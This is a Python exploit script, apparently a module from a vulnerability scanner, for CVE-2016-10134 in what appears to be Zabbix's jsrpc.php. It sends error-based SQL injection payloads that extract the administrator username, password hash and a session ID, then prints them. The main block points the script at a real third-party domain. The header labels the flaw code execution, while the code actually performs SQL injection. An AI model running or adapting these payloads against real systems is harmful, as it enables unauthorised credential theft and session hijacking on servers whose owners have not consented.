#!/usr/bin/env python3

'''
name: CVE-2016-10134 任意代码执行漏洞
description: CVE-2016-10134 任意代码执行漏洞
'''

import re
from app.lib.utils.request import request

class CVE_2016_10134_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
            }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url = self.url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        try:
            check_req = request.get(url, headers = self.headers)
            check_response = check_req.text
            sql_url = self.url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            sql_req = request.get(sql_url, headers = self.headers)
            sql_result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            sql_results = sql_result_reg.findall(sql_req.text)
            print('存在CVE-2016-10134漏洞,管理员、用户名密码为:', sql_results[0])
            session_url = self.url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            session_req = request.get(session_url, headers = self.headers)
            session_result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            session_results = session_result_reg.findall(session_req.text)
            print('SessionID为：' + session_results[0])
            return True
        except Exception as e:
            #print(e)
            print('不存在CVE-2016-10134漏洞')
            return False
        finally:
            pass

if __name__ == "__main__":
    CVE_2016_10134 = CVE_2016_10134_BaseVerify("https://baidu.com")
    CVE_2016_10134.run()